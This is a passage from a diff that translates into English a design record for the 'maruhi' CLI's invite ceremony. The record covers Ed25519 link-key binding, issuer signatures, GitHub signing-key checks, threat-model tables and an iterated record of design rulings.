+**Residual**: a different-UID user can read the page assets (public code) and `config.json` (public parameters) with the token, and can interrupt the ceremony with 5 fake POSTs (local DoS — repeatable on each run). No key material, and they can't influence the seal / restore result. Ruling A's threat model now explicitly lists "a different-UID user of the same machine" and notes it's closed by the confirmation code (this section is the revision record). CRYPTO_SPEC §8.2's "one-time token + Origin check" stays (this is an added layer, not a relaxation of the norm). Interaction with ②′ (`prfSaltHex` on status): the salt is a spec-designated public parameter, and if the PRF output is stolen the KEK is derivable regardless of salt exposure (KEK = HKDF(prf_out)). Hiding the salt adds no defense, so ②′ widens nothing against this enemy.
 
-英語の下書き。対応表と Codespaces の手順は実機 K0 の結果で埋める。
+#### 20-4. Draft of what to append to `/docs/recover-your-key` after real-hardware verification (not published — don't write what hasn't been verified)
+
+English draft. The support table and Codespaces steps are filled in from real-machine K0 results.
 
 > **Passkey** — Seal your master key to a passkey (Touch ID, Windows Hello, a security key, or a synced passkey manager) so a single biometric prompt restores it on any device where that passkey is available.
 >
@@ -881,2283 +882,873 @@ maruhi key seal passkey [--label <text>]                 maruhi key recover --pa
 >
 > Requirements: a browser and authenticator that support the WebAuthn PRF extension with user verification (**table: filled in after hardware verification**). Remote terminals (SSH, dev containers, Codespaces): forward the port shown to your local machine and open the URL there (**exact steps: filled in after verification**). Passkey ceremonies are refused on non-interactive terminals and in AI agent environments, like the other key ceremonies.
 
-### 補足 21: IV 設計録 — 招待儀式の軽量化(IV1 リンク束縛 + IV2 身元の裏付け。2026-09-13 — フェーズ 1 設計セッション → 同日承認・フェーズ 2 実装済み。実装録は 21-5)
+### Supplement 21: IV design record — lightening the invite ceremony (IV1 link binding + IV2 identity backing. 2026-09-13 — phase 1 design session → same-day approval, phase 2 implemented. Implementation log in 21-5)
 
-IV = 補足 18 の I1 + I2 を KL3(補足 19 / 20)と同じ仕様改訂サイクルで進める回。仕様改訂の起草は docs/notes/iv-spec-drafts.md(CRYPTO_SPEC §6.3 (a) / §6.5 / §11 / §14.3、AUTH_SPEC §15、AUDIT_SPEC §3.2)。本補足は設計の全体像・裁定の反復記録・実装分割・承認依頼項目を持つ。**正本 3 文書はまだ触っていない**(承認後の IV-K1 で反映)。
+IV = the round that advances supplement 18's I1 + I2 in the same spec-revision cycle as KL3 (supplements 19 / 20). The spec-revision draft is docs/notes/iv-spec-drafts.md (CRYPTO_SPEC §6.3 (a) / §6.5 / §11 / §14.3, AUTH_SPEC §15, AUDIT_SPEC §3.2). This supplement holds the design's overall picture, the iterated rulings record, the implementation split, and the items submitted for approval. **The 3 primary documents haven't been touched yet** (reflected in IV-K1 after approval).
 
-**承認(2026-09-13)**: 所有者は 21-4 の 17 項目を「残りの裁定事項も問題ないと思うなら、それで進めてよい」として委任承認した(項目 17 は同日の UX 追加巡で個別に承認済み)。反復の実態は 21-2 の初回表 + 追加巡 + UX 追加巡のとおりで、H・I・L・M は初回単巡だったものを追加巡で補った。同日 K1 として 3 正本 + CLAUDE.md(外部送信の解釈)+ ADR-0016 決定 7(充足形 4 の扱い)へ反映。以降はフェーズ 2(K2 以降)。K0(GitHub API の実測)は本環境からは不能のため所有者の手元で実施する前提とし、K5 は文書知識で実装して実測結果で文面を補正する。
+**Approval (2026-09-13)**: the owner delegated approval of 21-4's 17 items as "if the remaining ruling items look fine to you, proceed" (item 17 was approved individually in the same day's extra UX round). The actual iteration is as in 21-2's initial table + extra rounds + UX extra round; H, I, L, M were single-round judgments in the first pass and got extra rounds afterward. Reflected the same day as K1 into the 3 primary documents + CLAUDE.md (interpretation of outbound sends) + ADR-0016 decision 7 (treatment of satisfaction form 4). What follows is phase 2 (K2 onward). K0 (measuring the GitHub API) is impossible from this environment, so it's assumed done on the owner's machine; K5 is implemented from documented knowledge and its wording is corrected with the measured results.
 
-**設計の要点(補足 18 の原案からの変更)**: 原案は「リンクの秘密 S から HKDF で `redeem` / `bind` を導出し、受諾に `HMAC(bind, 鍵)` を添える」だった。裁定 A の反復で、**HMAC の代わりに招待ごとの Ed25519 鍵ペア(リンク鍵)を使う案が上位互換**と判明した — 検証鍵が公開値になるため、招待者側が保持するのは公開鍵だけで済み(HMAC 鍵 = 秘密の永続化問題が消える)、サーバーも受諾を検証でき、受諾は既存の受諾署名バイト列への**共同署名**として表せる。さらに裁定 E で、**発行署名**(招待者のチェーン署名鍵によるリンク内容の署名)を足すと、受諾者側の逆方向フィッシング対策も機械化できることが分かった(原案では受諾者側は 12 語のままだった)。暗号プリミティブは Ed25519 と SHA-256 のみで、HKDF / HMAC も新設しない。
+**Design point (changes from supplement 18's original)**: the original was "derive `redeem` / `bind` from the link secret S via HKDF, and attach `HMAC(bind, keys)` to the acceptance". In ruling A's iteration, **a per-invite Ed25519 keypair (the link key) turned out to be a superset of HMAC** — since the verification key is a public value, the inviter side only needs to keep the public key (the HMAC-key = secret-persistence problem disappears), the server can also verify acceptances, and the acceptance is expressible as a **joint signature** over the existing acceptance-signed bytes. Ruling E further showed that adding an **issuance signature** (the inviter's chain signing key signing the link's contents) mechanizes the accepter-side reverse-direction phishing defense (the original left the accepter side at 12 words). Crypto primitives are Ed25519 and SHA-256 only — no HKDF / HMAC is added.
 
-#### 21-1. 全体像 — 登場する値・誰が何を知るか・攻撃者ごとに何が不可能になるか
+#### 21-1. The whole picture — the values involved, who knows what, what becomes impossible for each attacker
 
 ```
-Alice(招待者)                         maruhi サーバー                    Bob(受諾者)
+Alice (inviter)                        maruhi server                      Bob (acceptor)
 ─────────────────────────────────────  ───────────────────────────────  ─────────────────────────────────
 invite create --github bob
-  id = ULID(クライアント採番)、k = 32 バイト乱数(リンク鍵の種)
+  id = ULID (client-assigned), k = 32 random bytes (link-key seed)
   (K_priv, K_pub) = Ed25519(k)
-  isig = Sign(alice_sig, invite_issue_signed_bytes)   ← id / K_pub / head / seq / role / 自分の鍵を覆う
-  POST /projects/:p/invites { id, role, linkPubHex: K_pub,  ──▶  行: 発行文(id, link_pub, head_hash, head_seq, role)+ issue_signature
-                              headHashHex, headSeq, issueSignatureHex }     (すべて公開値。秘密は無い)
-  pin(SHOULD): { linkPubHex: K_pub, role, expiresAtMs,         応答: { expiresAtMs }(トークンは返らない)
-                 expectedGithubLogin: "bob" }(非機密・手元だけ)
-  リンク(フラグメント。サーバーは見ない):
+  isig = Sign(alice_sig, invite_issue_signed_bytes)   ← covers id / K_pub / head / seq / role / own keys
+  POST /projects/:p/invites { id, role, linkPubHex: K_pub,  ──▶  row: issuance (id, link_pub, head_hash, head_seq, role) + issue_signature
+                              headHashHex, headSeq, issueSignatureHex }     (all public values. No secrets)
+  pin (SHOULD): { linkPubHex: K_pub, role, expiresAtMs,         response: { expiresAtMs } (no token returned)
+                 expectedGithubLogin: "bob" } (non-secret, local only)
+  link (fragment. The server never sees it):
     #v=2&i=<id>&k=<k>&p=<project>&h=<head>&s=<seq>&iu=<alice uid>&ie=<alice enc pub>&is=<alice sig pub>&r=<role>&il=alice&sig=<isig>
-        │ 人対人チャネル(Slack DM 等)
+        │ human channel (Slack DM etc.)
         ▼
                                                                           invite accept '<link>' [--from alice]
-                                                                            isig を is で検証(機械。失敗 = 拒否)
-                                                                            IV2: is ∈ GitHub(il).ssh_signing_keys ?(公開 API)
-                                                                            「github.com/alice からの招待」を --from か yes で確認
+                                                                            verifies isig with is (machine. failure = refuse)
+                                                                            IV2: is ∈ GitHub(il).ssh_signing_keys ? (public API)
+                                                                            confirms "an invite from github.com/alice" via --from or yes
                                                                             asig = Sign(bob_sig,  invite_accept_signed_bytes)
-                                                                            lsig = Sign(K_priv,   同じバイト列)   ← リンクを持つ者だけが作れる
+                                                                            lsig = Sign(K_priv,   the same bytes)   ← only the link holder can make it
                                                           ◀──  POST /invites/accept { linkPubHex, encPubHex, sigPubHex, acceptSignatureHex: asig, linkSignatureHex: lsig }
-                                       行を link_pub で解決 → lsig を link_pub で検証 → asig を sigPub で検証 → CAS(pending → accepted)
-                                       (サーバーは K_priv を持たないので、攻撃者鍵に対する lsig を作れない)
+                                       resolves the row by link_pub → verifies lsig with link_pub → verifies asig with sigPub → CAS (pending → accepted)
+                                       (the server doesn't hold K_priv, so it can't make an lsig for an attacker's key)
 member add
-  一覧行の発行文 + isig を**自分の sig 公開鍵**で検証(失敗 = 自分の発行ではない / 行のすり替え → 拒否。ピン不要・別端末でも成立)
-  pin があれば linkPubHex / role をさらに突合(SHOULD)
-  lsig を発行文の K_pub で検証(失敗 = 拒否。儀式へ落とさない)
-  asig を受諾鍵で検証(既存)
-  IV2: 受諾 sig 鍵 ∈ GitHub("bob").ssh_signing_keys ?
-  両方通れば "Acceptance is bound to the invite link you issued, and the key is listed on github.com/bob. Adding bob as member" → add_member(確認なし)
-  どちらかが照合不能なら従来の充足形(12 語 / --expect-fingerprint / 指紋帳 + yes)へ
+  verifies the listed row's issuance + isig with **its own sig public key** (failure = not its own issuance / row tampered → refuse. No pin needed; works from a different device)
+  if a pin exists, also compares linkPubHex / role (SHOULD)
+  verifies lsig with the issuance's K_pub (failure = refuse. Doesn't fall to the ceremony)
+  verifies asig with the acceptance key (existing)
+  IV2: acceptance sig key ∈ GitHub("bob").ssh_signing_keys ?
+  if both pass → "Acceptance is bound to the invite link you issued, and the key is listed on github.com/bob. Adding bob as member" → add_member (no confirmation)
+  if either can't be verified → the existing satisfaction forms (12 words / --expect-fingerprint / fingerprint book + yes)
 ```
 
-**登場する値と、誰が知るか**:
+**The values and who knows them**:
 
-| 値 | 生成者 | Alice | サーバー | Bob | 経路の攻撃者(リンクを読む) |
+| Value | Generator | Alice | Server | Bob | Path attacker (reads the link) |
 |---|---|---|---|---|---|
-| `k`(リンク鍵の種。32 バイト乱数)→ `K_priv` | Alice の CLI | 発行時だけメモリに(**永続化しない**) | **一度も渡らない** | リンクから | 知る |
-| `K_pub`(リンク公開鍵) | 同上 | 発行ピン(非機密)に保存 | 行 `link_pub`(公開値) | 導出 | 知る |
-| `isig`(発行署名 — Alice のチェーン sig 鍵) | Alice の CLI | `member add` で自鍵により再検証(発行文が自分のものである真実源) | 行に保存(公開値。偽造不能) | リンクから検証 | 知る(偽造不能) |
-| `asig`(受諾署名 — Bob のチェーン sig 鍵。既存) | Bob の CLI | 一覧で検証 | 保存・検証 | 生成 | — |
-| `lsig`(リンク署名 — `K_priv`) | Bob の CLI | **ピンの K_pub で検証** | 保存・検証(偽造不能) | 生成 | 先に受諾すれば作れる(残余 — IV2 が閉じる) |
-| GitHub の SSH 署名鍵(Bob / Alice の maruhi sig 公開鍵) | 各人が `maruhi key publish` | 公開 API で照合 | 関与しない | 公開 API で照合 | 公開情報 |
-| `expectedGithubLogin`(宛先 login)/ `il=`(招待者 login) | Alice が指定 / Alice の CLI(`/auth/me` の表示用 login) | 発行ピン(手元) | **持たない**(行・監査に書かない) | リンクから(照合材料。永続化しない) | 知る |
+| `k` (link-key seed. 32 random bytes) → `K_priv` | Alice's CLI | in memory only at issuance (**never persisted**) | **never transmitted** | from the link | knows it |
+| `K_pub` (link public key) | same | stored in the issuance pin (non-secret) | row `link_pub` (public value) | derives | knows it |
+| `isig` (issuance signature — Alice's chain sig key) | Alice's CLI | re-verified at `member add` under own key (the source of truth that the issuance is hers) | stored on the row (public value. Unforgeable) | verifies from the link | knows it (can't forge) |
+| `asig` (acceptance signature — Bob's chain sig key. Existing) | Bob's CLI | verified on the list | stored & verified | generates | — |
+| `lsig` (link signature — `K_priv`) | Bob's CLI | **verified with the pin's K_pub** | stored & verified (unforgeable) | generates | can make one by accepting first (residual — IV2 closes it) |
+| GitHub SSH signing keys (Bob / Alice's maruhi sig public keys) | each person via `maruhi key publish` | compared via public API | uninvolved | compared via public API | public info |
+| `expectedGithubLogin` (destination login) / `il=` (inviter login) | specified by Alice / Alice's CLI (from `/auth/me`'s display login) | issuance pin (local) | **not held** (not written to the row or audit) | from the link (comparison material. Not persisted) | knows it |
 
-**攻撃者ごとに何が不可能になるか**:
+**What becomes impossible for each attacker**:
 
-| 攻撃者 | 現行(儀式で防ぐ) | IV1 後 | IV1 + IV2 後 |
+| Attacker | Today (defended by the ceremony) | After IV1 | After IV1 + IV2 |
 |---|---|---|---|
-| **S: 悪意あるサーバー**(受諾ブロックの鍵すり替え) | 12 語の帯域外照合でのみ検出 | **暗号的に不可能**: `lsig` は `K_priv` が要り、サーバーは持たない。`K_pub` はピンで固定されるので行ごとのすり替えも検出 | 同左 |
-| **G: 公開鍵のゴースト追加**(攻撃者が自分のチェーンへ Alice の公開鍵を add_member し、Alice 名義のリンクを作る = 逆方向フィッシングの機械回避) | 電話でのみ検出(初回同期のアンカー検査は通ってしまう) | **不可能**: `isig` は Alice の秘密鍵が要る | 同左 |
-| **M: リンク経路の受動的な読み取り + 先着受諾** | 12 語で検出(攻撃者は Bob の 12 語を言えない) | 検出は同じ(儀式へ落ちる)。**受諾衝突(410)で Bob 側にも顕在化**(現行と同じ) | **事前に閉じる**: 攻撃者の鍵は github.com/bob に無い → Alice の CLI は自動追加せず儀式へ落ち、電話で「私の鍵ではない」→ 失効・再発行 |
-| **M′: リンク経路の能動的な差し替え**(攻撃者自身のプロジェクトへの有効なリンクに置換) | 電話で検出 | `isig` は攻撃者の鍵で有効(攻撃者は自プロジェクトの正当な owner)— 検出は Bob の識別次第 | Bob の CLI が「github.com/**mallory** からの招待」と表示し、`--from alice` の不一致で拒否(対話なら yes プロンプトで気づく) |
-| **D: Alice の端末のディスクを読む者** | 守備範囲外(キーチェーン・設定が同居) | 同左(ピンは公開鍵のみ。**秘密は増えない**) | 同左 |
+| **S: malicious server** (swapping the acceptance block's key) | Detected only via the 12-word out-of-band comparison | **Cryptographically impossible**: `lsig` needs `K_priv`, which the server never has. `K_pub` is pinned, so per-row tampering is detected too | same |
+| **G: ghost-adding a public key** (an attacker add_member's Alice's public key onto their own chain and builds a link in Alice's name = the machine side of reverse-direction phishing) | Detected only by phone (the first-sync anchor check passes) | **Impossible**: `isig` needs Alice's secret key | same |
+| **M: passive reading of the link path + first-to-accept** | Detected by the 12 words (the attacker can't say Bob's words) | Detection unchanged (falls to the ceremony). **Also surfaces on Bob's side via the acceptance collision (410)** (same as today) | **Closed beforehand**: the attacker's key isn't on github.com/bob → Alice's CLI doesn't auto-add and falls to the ceremony → phone reveals "not my key" → revoke + re-issue |
+| **M′: active substitution on the link path** (replacing it with a valid link to the attacker's own project) | Detected by phone | `isig` is valid under the attacker's key (the attacker is a legitimate owner of their own project) — detection depends on Bob's identification | Bob's CLI shows "an invite from github.com/**mallory**" and refuses on mismatch with `--from alice` (interactively, noticed at the yes prompt) |
+| **D: someone reading Alice's device disk** | Out of scope (keychain + config co-reside) | same (the pin holds only public keys. **No new secrets**) | same |
 
-**残余(正直に — §14.3 非保証 9 の候補)**: (1) リンク経路が読まれ、かつ攻撃者が Bob より先に受諾し、かつ **Bob の GitHub アカウントに攻撃者の鍵を置ける**(= GitHub アカウントの奪取)か、Alice が宛先 login を誤って指定した — この複合だけが IV2 を通る。裏付け元 `none`(儀式)ではリンク盗難は現行どおり 12 語で防ぐ。(2) M′ で Bob が表示された login を読まずに yes を打つ(`--from` を使えば機械照合)。(3) GitHub の公開 API が虚偽の鍵一覧を返す(GitHub は既に認証の根 — ADR-0009 — であり新しい信頼先ではない。加えて照合は「無ければ儀式」の fail-closed なので、GitHub が鍵を**隠す**ことはできても**足す**ことは Bob のアカウント側の事実になる)。(4) IdP に依存しない IV1 だけでは残余 (1) が「受諾衝突で検出」に留まる(補足 18 の I1 / I2 の関係のとおり)。
+**Residuals (honestly — candidates for §14.3 non-guarantee 9)**: (1) the link path is read AND the attacker accepts before Bob AND **can place their own key on Bob's GitHub account** (= a hijacked GitHub account) or Alice specified the wrong destination login — only this combination passes IV2. With backing source `none` (ceremony), link theft is defended by the 12 words as today. (2) In M′, Bob types yes without reading the displayed login (`--from` makes it machine-compared). (3) GitHub's public API returns a false key list (GitHub is already the root of auth — ADR-0009 — and not a new trust target. Moreover, since comparison is "if absent, ceremony" fail-closed, GitHub can **hide** a key but **adding** one is a fact on Bob's account side). (4) With IdP-independent IV1 alone, residual (1) stays at "detected via acceptance collision" (as in supplement 18's I1 / I2 relationship).
 
-**儀式の位置づけの変化**: 12 語の読み上げ・指紋帳・フラグは**消えない**。IV1 / IV2 が照合不能なとき(ピンの無い端末・GitHub 未登録・オフライン・裏付け元 `none`)の fail-closed フォールバックになる。§6.5 の「明示確認の充足形」に第 4 形(**リンク束縛 + 裏付け元の照合 = 確認入力なし**)を足し、これを既定にする。
+**Change in the ceremony's status**: the 12-word readout, the fingerprint book, and the flags **don't disappear**. They become the fail-closed fallback when IV1 / IV2 can't verify (a device without the pin, GitHub-unregistered, offline, backing source `none`). §6.5's "satisfaction forms of explicit confirmation" gains a 4th form (**link binding + backing-source comparison = no confirmation input**) and that becomes the default.
 
-#### 21-2. 裁定の反復記録
+#### 21-2. Iterated rulings record
 
-各裁定点で「3 案以上 → 上位互換 / 銀の弾丸の探索 → 新案が出なくなるまで」を回した。巡数は新案が出た回数(+ 最終確認 1 巡)。**(a)〜(d) の例外(規範文の改訂・crypto 変更・ADR・github.com 問い合わせ)は選ばずに推奨を付けて 21-4 に載せた**(表中は「推奨」)。
+At each ruling point we ran "3+ options → superset / silver-bullet search → until no new options emerge". The round count is the number of rounds that produced a new option (+ 1 final confirmation round). **The exceptions (a)–(d) (normative-text revisions, crypto changes, ADR, github.com queries) were not decided here but were carried to 21-4 with recommendations attached** (marked "recommended" in the table).
 
-| 裁定点 | 巡 | 検討した案と評価 | 結論 |
+| Ruling point | Rounds | Options considered and evaluation | Conclusion |
 |---|---|---|---|
-| **A. 束縛の形**(リンクの秘密から何を導き、受諾に何を添えるか) | 4 | ① **原案(補足 18 I1)**: `S` → HKDF で `redeem` / `bind`、受諾に `HMAC(bind, enc‖sig)`。サーバーは `bind` を知らないので偽造不能。**欠点**: Alice の `member add` 時に `bind`(秘密)が要る → 発行から最大 7 日後・別端末もあり得るのに、CLI が永続化してよいのは「API トークン・master 秘密鍵(いずれもキーチェーン)・非機密設定」だけ(CLAUDE.md)。`bind` をピン(非機密ファイル)に書けば規律違反、キーチェーンに書けば許可品目の追加(招待ごとのエントリの掃除も要る)。② **二秘密案**: サーバー生成のトークン `T`(現行のまま)+ クライアント生成の `bind` をリンクに併載。サーバー側の変更は最小だが ① と同じ永続化問題 + リンクに秘密が 2 つ。③ **リンク鍵ペア案(採用 = 推奨)**: リンクの秘密 `k` を Ed25519 の種とし、`(K_priv, K_pub)` を導出。サーバーは `K_pub` を保存(秘密のハッシュを保持する現行と同じ「検証できるが作れない」性質)、Bob は `K_priv` で受諾に共同署名(`lsig`)。**Alice が保持するのは `K_pub` だけ**(発行ピンの `tokenHashHex` の置き換え = 非機密)で ① の永続化問題が消える。サーバーも `lsig` を検証できる(不正な受諾を手前で落とせる。真実源は依然 Alice のクライアント検証)。`redeem` トークン自体が不要になる(署名がリンク保持の証明)。プリミティブは既存の Ed25519 + SHA-256 のみ。④ **銀の弾丸候補: リンク鍵を Alice の master 鍵から決定論的に導出**(`k = HKDF(sig seed, info = LP("maruhi/v1/invite-key", project, nonce))`; nonce は公開値として行に併置)。ピン不要・別端末でも検証可能。**不採用**: master 鍵素材の用途間流用に見える(§12 禁止事項「鍵の使い回し(用途間)」との境界が仕様解釈になる)+ §3 鍵階層への追記が要る。ピン不在は現行でも「儀式へ劣化」で受けており、その延長で足りる。将来 KL4 の委任モデルで再評価。⑤ 決定論署名を PRF に使う(`k = SHA-256(Sign(alice_sig, nonce))`): 独自構成 = 禁止。⑥ 受諾に Bob の秘密を使わない形(tag を Alice が後から再入力したリンクで検証): UX が IV の目的と逆行。⑦ **(追加巡で発見 — 採用)発行文をサーバー行に置く**: 招待 id をクライアントが採番し、発行署名 `isig`(裁定 E)が id / K_pub / head / seq / role / 招待者鍵を覆うので、発行時に発行文と `isig` をサーバーへ渡して行に保存すれば、Alice は `member add` で**自分の sig 公開鍵**により「この行は自分が発行したものか」を検証できる。**発行ピンの `K_pub` が真実源である必要が消え**(ピンは SHOULD の追加突合と宛先 login の保持だけになる)、④ の狙いだった別端末での `member add` が master 鍵の流用なしに成立する。サーバーは `isig` を偽造できず、別の行へ移植すると id / K_pub の束縛で落ちる。③ の上位互換。**署名対象**: `lsig` は既存 `invite_accept_signed_bytes`(v2 — token_hash の位置が `link_pub_hex` になる)と**同一バイト列**への共同署名(署名が tag を「覆う / 覆わない」の問いは、tag が署名になったことで「同じ文を 2 鍵で署名する」に収束 — 鍵 2 つ・受諾者 user_id・プロジェクト・link_pub が両署名に入るので、片方だけの差し替えはどちらかの検証で落ちる)。ドメイン文字列は `-v2` へ版上げ(§12-10 (2) の「旧実装が構造的に拒否する形」— `var-meta-sig-v2` の先例) | ③ + ⑦(21-4 項目 1) |
-| **B. サーバーの保存形・受諾 API** | 3 | ① **`link_pub` 列 + `link_signature` 列を追加型マイグレーションで足し、`token_hash`(NOT NULL)は新行では `lower_hex(SHA-256(link_pub bytes))` を書く legacy 列**(採用): D1 / SQLite は ADD COLUMN しかできず NOT NULL は外せない。参照は `link_pub`(UNIQUE)で行い、`token_hash` は将来の表再構築で落とす。② `token_hash` に `link_pub` の hex を**そのまま入れる**(64 文字で長さが同じ): 旧行のハッシュと新行の公開鍵が同じ列で見分けられない。不採用。③ 表の再構築(非追加型): 所有者指示に反する。④ 二秘密案(A ②)でトークン列を据え置く: A で不採用。**発行 body** = `{ id, role, linkPubHex, headHashHex, headSeq, issueSignatureHex }`(裁定 A ⑦: 招待 id はクライアント採番。サーバーは形式検査 + id / link_pub の UNIQUE 違反 409 のみで、発行署名は検証しない — 検証者は招待者自身と受諾者)、**応答** = `{ expiresAtMs }`(**秘密を返す口が無くなる**)。行に `head_hash` / `head_seq` / `issue_signature` を追加(すべて公開値。一覧行でそのまま返す)。**受諾 body** = `{ linkPubHex, encPubHex, sigPubHex, acceptSignatureHex, linkSignatureHex }`。サーバーの判定順: Schema 400 → 401 → 鍵素材条件 403 → 未知 link_pub 404 → 使用不能 410 → **`lsig` 422 → `asig` 422** → CAS。**サーバーが `lsig` を検証できる**のは A ③ の副産物で、「検証できないものをそのまま保存する」形(原案の tag)は無くなった — ただし真実源は Alice のクライアントの `K_pub` ピン照合であり、サーバー検証は二重の真実源ではなく手前の受理検査(§15-2 の受諾署名と同じ位置づけ)。旧行(`link_pub` NULL)は受諾不能(一覧で `unbound` と表示し失効を促す — 互換経路を作らない裁定 I) | ① |
-| **C. 招待リンクの形式** | 3 | ① `v=1` のまま `t` の意味だけ変える: 旧 CLI が旧リンクとして解釈しようとして意味不明なエラーになる。② **`v=2`**(採用): `#v=2&i=<招待 id〔ULID〕>&k=<種 hex 64>&p&h&s&iu&ie=<招待者 enc pub>&is=<招待者 sig pub>&r&il=<招待者 GitHub login>&sig=<発行署名 hex 128>`(`i` は発行署名が覆う invite_id — 受諾側の署名再構成に要るため K4 で追加)。`t` と `if` は廃止(FP は `ie`‖`is` から導出 — 冗長な 2 表現を持たない)。`v=1` は `unsupported-version` で拒否し「発行者に再発行を依頼」を案内(互換経路なし)。長さは約 530 文字(現行約 320)。③ フラグメントを base64 の 1 ブロブにする: 可読性・既存の解釈コードを捨てる割に利得なし。**生トークン受諾(`invite accept <token>`)は廃止**: v2 では種 `k` 単体でも `lsig` は作れるが、アンカー・発行署名・裏付けを全て失う経路を残す理由が無い(現行でも警告 + yes の劣化経路だった)。着地ページ `apps/web/public/invite.html` は不変(スクリプト無し・フラグメント非解釈 — 文言も「リンクをそのまま CLI へ」のままで正しい)。`r` は発行署名に含めるので改竄検出になる — 受諾応答の role と食い違えば**エラー**(現行の警告から格上げ)。`il` は発行署名に**含めない**(プロバイダ login を署名済み構造に載せない — 裁定 F。`il` の真正性は GitHub 照合で担保) | ② |
-| **D. `member add` の検証順序・失敗時の挙動・KF / フラグの位置づけ** | 3 | 順序: 一覧行の発行文 + `isig` を自分の sig 公開鍵で検証(失敗 = 自分の発行ではない / 行のすり替え → **拒否**。裁定 A ⑦ — ピン不要)→ ピンがあれば `linkPubHex` / role を突合(不一致 → **拒否**。SHOULD)→ `lsig` 検証(失敗 → **拒否**。「署名が壊れている受諾」を人間の 12 語で上書きさせない — 既存の `asig` 失敗と同じ扱い)→ `asig` 検証(既存)→ IV2 照合(不一致 → **儀式へ**: Bob が未登録なだけの可能性がある。照合不能〔オフライン・上限・login 不明〕→ 儀式へ + note)。**fail-closed の定義**: 「暗号検証の**失敗**は拒否、暗号検証の**不能**(材料が無い)は儀式へ劣化」。ピンが無い端末(別端末発行)でも IV1 は成立する(A ⑦ — 発行文の自己検証)。失うのは宛先 login だけなので `--github <login>` で補う(対話入力は K5 実装裁定で設けなかった — 21-5)。① フラグ `--expect-fingerprint` を退役: 非対話で GitHub 不使用の唯一の経路なので**残す**(充足形 2)。指定時は照合に加えて要求し、不一致は拒否。② KF を退役: 裏付け元 `none` / 照合不能時の yes-only 経路として**残す**(充足形 3)。IV の機械照合成功を帳に**記録しない**(帳は「人間が帯域外確認した」記録 — 意味を混ぜない。source 欄付き v2 は将来項)。③ 上位互換の探索 = 「第 4 形を既定にしつつ第 1〜3 形をフォールバックに温存」以上の案は出なかった。④ **(UX 追加巡 — 2026-09-13 所有者承認)照合不能のうち「相手の GitHub に鍵が無い」場合は、儀式へ入る前に二択で止める**: 「Bob に `maruhi key publish` を頼んで再実行する」か「今ここで 12 語の儀式を行う」か。不能 → 儀式へという定義は変えず、Alice が電話を強いられない導線を足す(非対話ではフラグ経路のみ — 従来どおり) | 上記 + ④ |
-| **E. 受諾者側の相互確認**(逆方向フィッシング) | 4 | ① 現状維持(12 語 / `--inviter-fingerprint` / 指紋帳): IV1 は受諾者側に何も与えないので、初回ペアでは電話が残り IV の利得が半減する。② IV2 を受諾者側にも適用: リンクの `il` の GitHub 署名鍵に `is` があるかを照合。**単独では不十分**と判明: 攻撃者が自分のチェーンへ Alice の**公開**鍵をゴースト add_member し、`iu`=Alice・`is`=Alice の公開鍵(GitHub で公開)・`il`=alice のリンクを作れば、GitHub 照合も初回同期のアンカー検査(チェーン上の `iu` の FP 一致)も通る。現行はこれを電話でしか防いでいない。③ **上位互換: 発行署名 `isig`**(採用 = 推奨): Alice のチェーン sig 鍵で `invite_issue_signed_bytes = LP("<suite>/invite-issue", project_id, link_pub_hex, head_hash_hex, head_seq, role, inviter_user_id, inviter_enc_pub_hex, inviter_sig_pub_hex)` に署名し、リンクに載せる。Bob は `is` で検証(失敗 = 拒否)。ゴースト追加者は Alice の秘密鍵を持たないので Alice 名義のリンクを作れない。副産物: **アンカー全体(p/h/s/r)が改竄検出可能**になり、初回同期の検査に「チェーン上の `iu` の sig 公開鍵 == `is`」を足せる。④ Bob の識別: `isig` + IV2 で「github.com/`il` の鍵の保持者が発行した」まで機械化されるが、「Bob が**その人**からの招待を期待していたか」は Bob しか知らない → `--from <login>`(非対話・エージェント環境ではこれのみ)または対話の yes 1 回(「github.com/alice からの招待 — 期待どおりなら yes」)。**12 語は消える**。⑤ 銀の弾丸候補: yes も消す(受諾を完全自動)→ 不採用: 受諾は Bob の能動的な参加意思の表明であり、M′(差し替えられた有効リンク)の最後の防衛が「login を読む」ことだから。**残る手順は 1 回の yes(電話なし)** | ③ + ④(21-4 項目 2) |
-| **F. IV2 で相手の GitHub login をどう知るか** | 4 | ① **宛先指定 `invite create --github <login>`**(採用): Alice は Slack で bob に DM する直前に login を知っている。発行ピン(**手元・非機密**)に `expectedGithubLogin` として保存。サーバー行・監査・チェーンには**書かない**。`member add` は照合が自動で終わり、確認入力なし(意図の表明が add 時から create 時へ移る)。② `member add --github <login>` / 対話プロンプト: ① のピンが無いときのフォールバック(採用 — 併用)。③ 受諾ブロックの自己申告(Bob が自分の login を受諾に載せる): 攻撃者も自分の login を申告できるので照合は「内部整合」しか示さず、Alice が名前を読んで yes する確認が残る。加えてプロバイダ login をサーバー保存・署名済み構造に載せることになる(§15-1「サーバー申告の表示名を信頼させる面を作らない」の逆行)。不採用。④ 帯域外で控えて add 時に打つ: ② と同じ。⑤ 受諾者側(Bob が Alice の login を知る): リンクの `il=`(Alice の CLI が `/auth/me` の表示用 login から組む)— **フラグメントのみ**(サーバーは見ない・Bob のアンカーピンに永続化しない・GitHub 照合の材料としてだけ使う)。self-declared だが `isig` + GitHub 照合により「`il` の GitHub に `is` が無ければ照合不能 → 儀式」で嘘は通らない。⑥ 銀の弾丸候補: login を一切使わず鍵 → login の逆引きを GitHub に求める: そのような API は無い | ① + ② + ⑤(21-4 項目 7) |
-| **G. IV2 の問い合わせ・`key publish`・OpenSSH 符号化** | 4 | 問い合わせ: ① **HTTPS 直(Effect `HttpClient`、`GET https://api.github.com/users/{login}/ssh_signing_keys`、無認証)**(採用 = 推奨): 公開情報・maruhi CLI は GitHub のトークンを一切持たない(ログインはサーバー仲介 — AUTH §4)ので認証付きにはできない。上限は文書上 60 回 / 時 / IP(**未検証** — 本セッションの環境はプロキシが api.github.com のユーザー系パスを遮断し実測できなかった。K0 で確認)。`member add` は稀なので十分。ホストは `api.github.com` 固定(sync-http.ts と同じ「設定でホストを差し替える口は無い」)。② `gh api` 経由(利用者の gh 認証で 5,000 / 時): gh 未導入で成立しない・二経路の保守。不採用(読みは直、書きは gh)。③ サーバーが代理で照合: サーバーを経路に戻すので本末転倒。不採用。失敗時(オフライン・403 / 429・プロキシ): 儀式へ劣化 + note(裁定 D)。プロキシ環境(HTTPS_PROXY)での Bun fetch の挙動は**未検証**(K0)。送る情報は login だけ(プロジェクト・鍵・値は送らない)。**`key publish`**: ④ **印字 + `--gh` で `gh ssh-key add --type signing --title "maruhi <fingerprint>"` を呼ぶ**(採用): 既定は OpenSSH 1 行 + `https://github.com/settings/ssh/new`(Key type = Signing 